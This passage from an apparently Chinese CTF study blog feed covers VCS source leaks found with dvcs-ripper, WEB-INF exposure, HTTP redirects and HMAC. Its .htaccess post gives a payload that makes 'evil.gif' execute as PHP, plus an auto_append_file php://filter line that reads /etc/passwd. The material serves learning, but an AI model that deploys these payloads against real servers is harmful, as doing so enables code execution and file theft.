myFile</code></pre><ul><li>为myFile文件撤销可执行权限</li></ul><pre><code>git add --chmod=-x myFilegit update-index --chmod=-x myFile</code></pre><ol start="2"><li><code>git merge-index</code>命令<br>为Index中需要合并的文件执行合并操作。<br>基本用法：</li></ol><pre><code>git merge-index [-o] [-q] &lt;merge-program&gt; (-a | [--] &lt;file&gt;*)</code></pre><p>示例：</p><pre><code>git merge-index cat a_script_file</code></pre><p>Git的内容挺多的，以上只涉及到了跟CTF有关的内容，以后有机会还得深入了解学习一下。</p><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><blockquote><p>当开发人员使用 SVN （Subversion）进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p></blockquote><p>使用工具dvcs-ripper  链接：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a></p><p>在windows上使用没成功，环境不对，安装了active Perl也不行，还缺少个SQLite和什么东西，于是直接在kali上使用好了</p><ul><li>安装：<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code></li><li>gitclone: <code>git clone https://github.com/kost/dvcs-ripper</code></li><li>进入目录</li><li>命令： <code>./rip-svn.pl -v -u http://www.example.com/.svn/</code></li></ul><p>然后会克隆下来一个.svn文件夹，默认是隐藏文件夹，按Ctrl+H显示，之后自行寻找.svn文件夹中关于flag的线索即可</p><p>如果系统中有Subversion的话，</p><p>通过svn命令可以根据时间或修订号去除过去的版本，或者某一版本所做的具体的修改。以下四个命令可以用来查看svn 的历史：</p><ul><li><strong>svn log:</strong> 用来展示svn 的版本作者、日期、路径等等。</li><li><strong>svn diff:</strong> 用来显示特定修改的行级详细信息。</li><li><strong>svn cat:</strong> 取得在特定版本的某文件显示在当前屏幕。</li><li><strong>svn list:</strong> 显示一个目录或某一版本存在的文件。</li></ul><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><blockquote><p><strong>Mercurial</strong>是<a href="https://zh.wikipedia.org/wiki/跨平台" target="_blank" rel="noopener">跨平台</a>的<a href="https://zh.wikipedia.org/wiki/分布式版本控制" target="_blank" rel="noopener">分布式版本控制</a>软件，主要由<a href="https://zh.wikipedia.org/wiki/Python" target="_blank" rel="noopener">Python</a>语言实现，但也包含用<a href="https://zh.wikipedia.org/wiki/C语言" target="_blank" rel="noopener">C语言</a>实现的二进制比较工具。Mercurial一开始的主要运行平台是<a href="https://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a>，现在Mercurial已经移植到<a href="https://zh.wikipedia.org/wiki/Windows" target="_blank" rel="noopener">Windows</a>、<a href="https://zh.wikipedia.org/wiki/Mac_OS_X" target="_blank" rel="noopener">Mac OS X</a>和大多数的<a href="https://zh.wikipedia.org/wiki/类Unix" target="_blank" rel="noopener">类Unix</a>系统中。Mercurial主要由<a href="https://zh.wikipedia.org/wiki/命令行界面" target="_blank" rel="noopener">命令行</a>程序组成，现在也有了<a href="https://zh.wikipedia.org/wiki/图形用户界面" target="_blank" rel="noopener">图形用户界面</a>。对Mercurial的所有操作都由用不同的关键字作为参数调用程序“hg”来实现，Hg是参考<a href="https://zh.wikipedia.org/wiki/水银" target="_blank" rel="noopener">水银</a>的<a href="https://zh.wikipedia.org/wiki/化学符号" target="_blank" rel="noopener">化学符号</a>而取的名字。</p></blockquote><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p>仍然使用dvcs-ripper工具将.hg文件夹克隆到本地。然后可以使用命令查找 ，也可以使用手工查找。</p><p>遇到这种版本控制系统的信息泄露情况，如果会使用这些版本空控制系统，显然会有很多的好处。如果不熟悉它们的话，也不用太过担心，很多时候手工也能找到有用信息。不过有机会还是学习使用一下这些版本控制系统，或者了解一些原理和命令好了，毕竟没有坏处。</p><h2 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h2><p>还是使用dvcs-ripper工具克隆然后分析。</p><p>以后有机会详细学习记录一下这几个常见的版本控制系统吧。</p><h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p><pre><code> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。​       /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中​       /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件​       /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。​    /WEB-INF/database.properties：数据库配置文件</code></pre><p>漏洞成因：</p><p>​    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p><strong>漏洞检测以及利用方法</strong>：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Http重定向</title>
      <link href="/2021/01/11/2021-1-11-http-chong-ding-xiang/"/>
      <url>/2021/01/11/2021-1-11-http-chong-ding-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP重定向以及在CTF中的应用"><a href="#HTTP重定向以及在CTF中的应用" class="headerlink" title="HTTP重定向以及在CTF中的应用"></a>HTTP重定向以及在CTF中的应用</h1><blockquote><p>URL 重定向，也称为 URL 转发，是一种当实际资源，如单个页面、表单或者整个 Web 应用被迁移到新的 URL 下的时候，保持（原有）链接可用的技术。HTTP 协议提供了一种特殊形式的响应—— HTTP 重定向（HTTP redirects   响应码300系列）来执行此类操作。</p></blockquote><p>网页重定向可实现许多目标：</p><ul><li>站点维护或停机期间的临时重定向。</li><li>永久重定向将在更改站点的URL，上传文件时的进度页等之后保留现有的链接/书签。</li><li>作为上传文件时的表示进度的页面。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。</p><p>浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载，要注意的是，<strong>跳转是由浏览器完成的，所以给非浏览器客户端发送跳转信息是可能发生错误的</strong></p><p>大多数情况下，除了会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。</p><p><img src="https://mdn.mozillademos.org/files/13785/HTTPRedirect.png" alt="img"></p><p>不同类型的重定向映射可以划分为三个类别：</p><ol><li>永久重定向</li><li>临时重定向</li><li>特殊重定向</li></ol><h3 id="永久重定义"><a href="#永久重定义" class="headerlink" title="永久重定义"></a>永久重定义</h3><p>这种重定向操作是永久性的。它表示原 URL 不应再被使用，而应该优先选用新的 URL。搜索引擎机器人会在遇到该状态码时触发更新操作，在其索引库中修改与该资源相关的 URL 。</p><table><thead><tr><th align="left">编码</th><th align="left">含义</th><th align="left">处理方法</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left"><code>301</code></td><td align="left">Moved Permanently</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET" target="_blank" rel="noopener"><code>GET</code></a> 方法不会发生变更，其他方法有可能会变更为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET" target="_blank" rel="noopener"><code>GET</code></a> 方法。</td><td align="left">网站重构。</td></tr><tr><td align="left"><code>308</code></td><td align="left">Permanent Redirect</td><td align="left">方法和消息主体都不发生变化。</td><td align="left">网站重构，用于非GET方法。</td></tr></tbody></table><h3 id="临时重定向"><a href="#临时重定向" class="headerlink" title="临时重定向"></a>临时重定向</h3><p>有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下可以使用临时重定向。</p><p>搜索引擎不会记录该新的、临时的链接。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面。</p><table><thead><tr><th align="left">编码</th><th align="left">含义</th><th align="left">处理方法</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left"><code>302</code></td><td align="left"><code>Found</code></td><td align="left">GET 方法不会发生变更，其他方法有可能会变更为 GET 方法。</td><td align="left">由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。</td></tr><tr><td align="left"><code>303</code></td><td align="left"><code>See Other</code></td><td align="left">GET 方法不会发生变更，其他方法会<strong>变更</strong>为 GET 方法（消息主体会丢失）。</td><td align="left">用于PUT 或 POST 请求完成之后进行页面跳转来防止由于页面刷新导致的操作的重复触发。</td></tr><tr><td align="left"><code>307</code></td><td align="left"><code>Temporary Redirect</code></td><td align="left">方法和消息主体都不发生变化。</td><td align="left">由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。</td></tr></tbody></table><p>该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 307 状态码被创建用来消除在使用非 GET 方法时的歧义行为。</p><h3 id="特殊重定向"><a href="#特殊重定向" class="headerlink" title="特殊重定向"></a>特殊重定向</h3><p>除了上述两种常见的重定向之外，还有两种特殊的重定向。<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304" target="_blank" rel="noopener"><code>304</code></a> （Not Modified，资源未被修改）会使页面跳转到本地陈旧的缓存版本当中（该缓存已过期(?)），而 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300" target="_blank" rel="noopener"><code>300</code></a> （Multiple Choice，多项选择） 则是一种手工重定向：以 Web 页面形式呈现在浏览器中的消息主体包含了一个可能的重定向链接的列表，用户可以从中进行选择。</p><table><thead><tr><th align="left">编码</th><th align="left">含义</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left"><code>300</code></td><td align="left"><code>Multiple Choice</code></td><td align="left">不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link" target="_blank" rel="noopener"><code>Link</code></a> 头部加入机器可读的 <code>rel=alternate</code></td></tr><tr><td align="left"><code>304</code></td><td align="left"><code>Not Modified</code></td><td align="left">发送用于重新验证的条件请求。表示缓存的响应仍然是新鲜的并且可以使用。</td></tr></tbody></table><h2 id="设置重定向的方法"><a href="#设置重定向的方法" class="headerlink" title="设置重定向的方法"></a>设置重定向的方法</h2><h3 id="1-在服务器中设置重定向"><a href="#1-在服务器中设置重定向" class="headerlink" title="1.在服务器中设置重定向"></a>1.在服务器中设置重定向</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>重定向映射可以在服务器的配置文件中设置，也可以在每一个文件目录的 .htaccess 文件中设置。</p><p>在配置文件中：</p><p><a href="https://httpd.apache.org/docs/current/mod/mod_alias.html" target="_blank" rel="noopener">mod_alias</a> 模块提供了 <code>Redirect</code> 和 <code>Redirect_Match</code> 两种指令来设置 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302" target="_blank" rel="noopener"><code>302</code></a> 响应（默认值）：</p><pre><code>&lt;VirtualHost *:443&gt;    ServerName example.com    Redirect / https://www.example.com&lt;/VirtualHost&gt;</code></pre><p>URL <code>https://example.com/</code> 会被重定向至 <code>https://www.example.com/</code> ，URL 下的任何文件或目录也将重定向到该 URL（<code>https://example.com/some-page</code> 将重定向至 <code>https://www.example.com/some-page</code>）。</p><p><code>Redirect_Match</code> 指令的功能与之类似，不同之处在于它可以通过<a href="https://wiki.developer.mozilla.org/en-US/docs/Glossary/Regular_expression" target="_blank" rel="noopener">正则表达式</a>来指定一批受影响的 URL ：</p><pre><code>RedirectMatch ^/images/(.*)$ http://images.example.com/$1</code></pre><p>位于 <code>images/</code> 文件夹下的所有文档都会被重定向至新的域名。</p><p>如果你不想要设置临时跳转，那么可是使用额外的参数（使用 HTTP 状态码或者 permanent 关键字）来进行设置：</p><pre><code>Redirect permanent / https://www.example.com# …acts the same as:Redirect 301 / https://www.example.com</code></pre><p><a href="http://httpd.apache.org/docs/current/mod/mod_rewrite.html" target="_blank" rel="noopener">mod_rewrite</a> 模块也可以用来设置重定向映射。它应用起来更灵活，但也更加复杂。</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>在 Nginx 的配置文件中，编辑或创建一个服务器模块来进行重定向设置：</p><pre><code>server {    listen 80;    server_name example.com;    return 301 $scheme://www.example.com$request_uri;}</code></pre><p>可以使用 rewrite 指令来针对一个文件目录或者一部分页面应用重定向设置：</p><pre><code>rewrite ^/images/(.*)$ http://images.example.com/$1 redirect;rewrite ^/images/(.*)$ http://images.example.com/$1 permanent;</code></pre><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><p>在 IIS 中，可以使用 <code>&lt;httpRedirect&gt;</code> 元素来配置重定向映射。</p><h2 id="其它方法设置重定向"><a href="#其它方法设置重定向" class="headerlink" title="其它方法设置重定向"></a>其它方法设置重定向</h2><p>HTTP 协议中重定向机制并非唯一的重定向映射的方式。其他两种方法包括：</p><ol><li>借助 HTML 的 meta 元素的 HTML 重定向机制</li><li>借助 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model" target="_blank" rel="noopener">DOM</a> 的 JavaScript 重定向机制。</li></ol><h3 id="HTML-重定向机制"><a href="#HTML-重定向机制" class="headerlink" title="HTML 重定向机制"></a>HTML 重定向机制</h3><p>HTTP 协议中重定向机制是应该优先采用的创建重定向映射的方式，但是有时候 Web 开发者对于服务器没有控制权，或者无法对其进行配置。针对这些特定的应用情景，Web 开发者可以在精心制作的 HTML 页面的<code>head</code>部分添加一个<code>meta</code> 元素，并将其 <code>http-equiv</code> 属性的值设置为 <code>refresh</code> 。当显示页面的时候，浏览器会检测该元素，然后跳转到指定的页面。</p><pre><code>&lt;head&gt;  &lt;meta http-equiv="Refresh" content="0; URL=http://example.com/" /&gt;&lt;/head&gt;</code></pre><p><code>content</code> 属性的值开头是一个数字，指示浏览器在等待该数字表示的秒数之后再进行跳转。建议始终将其设置为 0 来获取更好的可访问性。</p><p>显然，该方法仅适用于 HTML 页面（或类似的页面），然而并不能应用于图片或者其他类型的内容。</p><p>注意这种机制会使浏览器的回退按钮失效：可以返回含有这个头部的页面，但是又会立即跳转。</p><h3 id="JavaScript-重定向机制"><a href="#JavaScript-重定向机制" class="headerlink" title="JavaScript 重定向机制"></a>JavaScript 重定向机制</h3><p>在 JavaScript 中，重定向机制的原理是设置 <code>window.location</code> 的属性值，然后加载新的页面。</p><pre><code>window.location = "http://example.com/";</code></pre><p>与 HTML 重定向机制类似，这种方式并不适用于所有类型的资源，并且显然只有在支持 JavaScript 的客户端上才能使用。另外一方面，它也提供了更多的可能性，比如在只有满足了特定的条件的情况下才可以触发重定向机制的场景。</p><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><p>由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：</p><ol><li>HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。</li><li>HTML 的重定向机制 <code>meta</code> 会在 HTTP 协议重定向机制未设置的情况下触发。</li><li>JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。</li></ol><p>任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制，而不要使用 <code>meta</code>标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他严重事故的发生。</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>有以下几种应用场景可以使用重定向机制，但是需要注意应该尽可能地限制其使用数量，因为每一次重定向都会降低使用效率。</p><h3 id="域名别称"><a href="#域名别称" class="headerlink" title="域名别称"></a>域名别称</h3><p>理想情况下，一项资源只有一个访问位置，也就是只有一个 URL 。但是由于种种原因，需要为资源设定不同的名称（即不同的域名，例如带有和不带有 www 前缀的URL，以及简短易记的 URL 等）。在这种情况下，实用的方法是将其重定向到那个实际的（标准的）URL，而不是复制资源。</p><p>在以下几种情况下可以使用域名别称：</p><ul><li><p><strong>扩大站点的用户覆盖面</strong></p><p>一个常见的场景是，假如站点位于 <code>www.example.com</code> 域名下，那么通过 <code>example.com</code>也应该可以访问到。这种情况下，可以建立从 <code>example.com</code> 的页面到 <code>www.example.com</code> 的重定向映射。此外还可以提供常见的同义词，或者该域名容易导致的拼写错误的域名别称。</p></li><li><p><strong>迁移到另外一个域名</strong></p><p>例如，公司改名后，你希望用户在搜索旧名称的时候，依然可以访问到应用了新名称的站点。</p></li><li><p><strong>强制使用 HTTPS 协议</strong></p><p>对于 HTTP 版本站点的请求会被重定向至采用了 HTTPS 协议的版本。</p></li><li><p><strong>保持链接有效</strong></p></li></ul><p>当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你可以更新站点内部的链接来适应新的命名体系，但无法控制被外部资源使用的 URL 。</p><p>你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户（并且帮助优化你的SEO），所以需要建立从旧链接到新链接的重定向映射。</p><p>即便是这项技术可以同样应用于内部链接，但是应该尽量避免内部重定向映射。重定向机制会带来相当大的性能开销（额外的 HTTP 请求），所以如果你可以通过修复链接来避免的话，那么就应该将其修复。</p><h3 id="对于不安全请求的临时响应"><a href="#对于不安全请求的临时响应" class="headerlink" title="对于不安全请求的临时响应"></a>对于不安全请求的临时响应</h3><p>不安全请求会修改服务器端的状态，应该避免用户无意的重复操作。</p><p>通常，你并不想要你的用户重复发送  PUT、POST 或 DELETE 请求。假如你仅仅为该类请求返回响应的话，简单地点击刷新按钮就会（可能会有一个确认信息）导致请求的重复发送。</p><p>在这种情况下，服务器可以返回一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303" target="_blank" rel="noopener"><code>303</code></a> (See Other) 响应，其中含有合适的响应信息。如果刷新按钮被点击的话，只会导致该页面被刷新，而不会重复提交不安全的请求。</p><h3 id="对于耗时请求的临时响应"><a href="#对于耗时请求的临时响应" class="headerlink" title="对于耗时请求的临时响应"></a>对于耗时请求的临时响应</h3><p>一些请求的处理会需要比较长的时间，比如有时候 DELETE 请求会被安排为稍后处理。在这种情况下，会返回一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303" target="_blank" rel="noopener"><code>303</code></a> (See Other)  重定向响应，该响应链接到一个页面，表示请求的操作已经被列入计划，并且最终会通知用户操作的进展情况，或者允许用户将其取消。</p><h2 id="在CTF中的应用"><a href="#在CTF中的应用" class="headerlink" title="在CTF中的应用"></a>在CTF中的应用</h2><h3 id="使用curl工具"><a href="#使用curl工具" class="headerlink" title="使用curl工具"></a>使用curl工具</h3><p>如果需要获得跳转前的页面中的信息，使用curl命令行工具是非常常见的，因为curl默认是不跟随跳转的，除非添加了-L参数才会跟随跳转。</p><h3 id="使用bp抓包"><a href="#使用bp抓包" class="headerlink" title="使用bp抓包"></a>使用bp抓包</h3><p>这个方法也很简单，抓包，放入Repeater模块，发送过去就行了，它会把服务器发过来的包都截下来的，因为重定向是由浏览器执行的，所以信息都仍然保留在服务器回复的报文里。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 300状态码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.htaccess文件</title>
      <link href="/2020/12/23/2020-12-23-apache-de.htaccess-wen-jian/"/>
      <url>/2020/12/23/2020-12-23-apache-de.htaccess-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h1><p><strong>.htaccess是在Apache HTTP Server这款服务器架设软件下的一个对于系统目录进行各种权限规则设置的一个文件</strong>，存在于Linux操作系统中。</p><p>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p><p>可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>Apache的标准配置文件是httpd.conf,但这是Apache的配置文件，一旦修改，改的是网络服务器的全局配置。</p><p>ctf中最常用的.htaccess文件</p><pre class="line-numbers language-asp"><code class="language-asp"><FilesMatch "evil.gif">    SetHandler application/x-httpd-php</FilesMatch><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将evil.gif文件（只要包含”evil.gif”这个字符串的任意文件，无论扩展名是什么(没有也行)）按php文件解析</p><p><code>php_value</code>是.htaccess文件中可以用的指令之一。该指令允许我们使用PHP_INI_PERDIR标志修改此处列表里的任何设置。</p><p>在这些设置中，有个auto_append_file，它允许我们在请求PHP文件时添加或包含一个文件。后来发现，auto_append_file还允许各种包装器，如php://</p><pre><code>AddType application/x-httpd-php .cnm    //AddType和AddHandler 都可以添加解析规则php_value auto_append_file "php://filter/convert.base64-encode/resource=/etc/passwd"</code></pre><p>将以<code>.cnm</code>为文件后缀的文件解析为php文件，并且在请求它时，包含base64编码过的<code>/etc/passwd</code>文件的内容。</p><p>这里可以大胆想象，如果能传入一个内容base64编码过的恶意php代码的文件，便可以利用.htaccess文件把它的内容读到<code>.cnm</code>后缀的文件中进行执行。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-12-22-hash-HMAC算法</title>
      <link href="/2020/12/22/2020-12-22-hash-hmac-suan-fa/"/>
      <url>/2020/12/22/2020-12-22-hash-hmac-suan-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Hmac算法"><a href="#Hmac算法" class="headerlink" title="Hmac算法"></a>Hmac算法</h1><p>​    写题目看到了hash-hmac()加密函数，于是稍微了解一下hmac加密算法，顺便做个笔记，不然学了等于没学，看了也白看。</p><p>​    虽然基本上人人都懂哈希（hash）算法，但说Hmac算法之前还是得简单提一嘴哈希算法：</p><p><strong>哈希算法</strong>（Hash）又称摘要算法（DiHgest），原理是对一组信息数据通过某种函数（这种作用的函数可以统称为哈希函数）进行计算，得到一个固定长度的<strong>信息摘要</strong>。</p><p>​    而通过这个定长的信息摘要，几乎不可能逆推出原始的数据。并且，相同的原始数据得到的信息摘要一定相同，不同的原始数据得到相同摘要的可能性则非常非常小（越长的原始数据，信息摘要相同的可能性越小）。这就使得这个信息摘要几乎具有唯一性，可以用来唯一认证这个原始数据。这个特性可以用在密码验证和保存机制中（机密性），亦可以用来校验信息（完整性）。</p><p>​    例如大部分网站存储用户口令，存储的并不是口令本身，而是口令的哈希值，这样即使黑客通过手段拿到了数据库中用户的哈希口令，也没法通过这个口令登录用户系统。除非使用穷举的方法“碰撞”出哈希值与它相等的口令来。</p><p>​    但黑客也不一定要用暴力穷举的方法破解哈希口令，常用的针对哈希口令的攻击，叫做“彩虹表攻击”。</p><p>就是一个预先计算好的常用口令和它们的MD5的对照表：</p><table><thead><tr><th align="left">常用口令</th><th align="left">MD5</th></tr></thead><tbody><tr><td align="left">hello123</td><td align="left">f30aa7a662c728b7407c54ae6bfd27d1</td></tr><tr><td align="left">12345678</td><td align="left">25d55ad283aa400af464c76d713c07ad</td></tr><tr><td align="left">passw0rd</td><td align="left">bed128365216c019988915ed3add75fb</td></tr><tr><td align="left">19700101</td><td align="left">570da6d5277a646f6552b8832012f5dc</td></tr><tr><td align="left">…</td><td align="left">…</td></tr><tr><td align="left">20201231</td><td align="left">6879c0ae9117b50074ce0a0d4c843060</td></tr></tbody></table><p>如果用户使用了以上常见口令，黑客就很容易通过MD5值找到这个口令。</p><p>而最简单的抵御彩虹表攻击的方法，是对每个口令额外添加随机数，这个方法称之为加盐（salt）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$digest</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token operator">+</span><span class="token variable">$inputPassword</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。</p><p>Hmac算法就是一种基于密钥的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。</p><p>Hmac算法总是和某种哈希算法配合起来用的。例如PHP中的hash-hmac()函数的第一个参数就是指定一个哈希函数，如：”md5”，”sha256”，”haval160,4” 等</p><p>hash-hmac-algos()函数可以用来返回所有可用的hash()函数，它的返回值是一个由所有可用hash函数名字组成的列表。</p><hr><p>HMAC算法除了需要信息摘要算法外，还需要一个密钥。HMAC的密钥可以是任何长度，如果密钥的长度超过了摘要算法信息分组的长度，则首先使用摘要算法计算<strong>密钥的摘要</strong>作为新的密钥。一般不建议使用太短的密钥，因为密钥的长度与安全强度是相关的。通常选取密钥长度不小于所选用摘要算法输出的信息摘要的长度。</p><blockquote><p>HMAC算法本身并不复杂，起需要有一个哈希函数，我们记为<strong>H</strong>。同时还需要有一个密钥，我们记为<strong>K</strong>。每种信息摘要函数都对信息进行分组，每个信息块的长度是固定的，我们记为<strong>B</strong>（如：SHA1为512位，即64字节）。每种信息摘要算法都会输出一个固定长度的信息摘要，我们将信息摘要的长度记为<strong>L</strong>（如MD5为16字节，SHA-1为20个字节）。正如前面所述，K的长度理论上是任意的，一般为了安全强度考虑，选取不小于L的长度。</p></blockquote><p>HMAC算法其实就是利用密钥和明文进行两轮哈希运算，以公式可以表示如下：</p><pre><code>HMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））</code></pre><p>其中：</p><p>Ipad为0x36重复B次</p><p>Opad为0x5c重复B次</p><p>M 代表一个消息数据组</p><h3 id="HMAC算法的运算步骤："><a href="#HMAC算法的运算步骤：" class="headerlink" title="HMAC算法的运算步骤："></a><strong>HMAC算法的运算步骤：</strong></h3><p>（1）检查<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>K的长度。如果K的长度大于B则先使用摘要算法计算出一个长度为L的新密钥。如果后K的长度小于B，则在其后面追加0来使其长度达到B。</p><p>（2）将上一步生成的B字长的密钥字符串与ipad做异或运算。</p><p>（3）将需要处理的数据流M填充至第二步的结果字符串中。</p><p>（4）使用哈希函数H计算上一步中生成的数据流的信息摘要值。</p><p>（5）将第一步生成的B<a href="https://baike.baidu.com/item/字长" target="_blank" rel="noopener">字长</a>密钥字符串与opad做异或运算。</p><p>（6）再将第四步得到的结果填充到第五步的结果之后。</p><p>由上述描述过程，我们知道HMAC算法的计算过程实际是对原始数据做了两次<strong>类似于</strong>加盐处理的哈希加密过程。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 哈希 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含+伪协议</title>
      <link href="/2020/12/07/2020-12-07-php-wei-xie-yi-zhuan-zi-my0n9s-da-lao/"/>
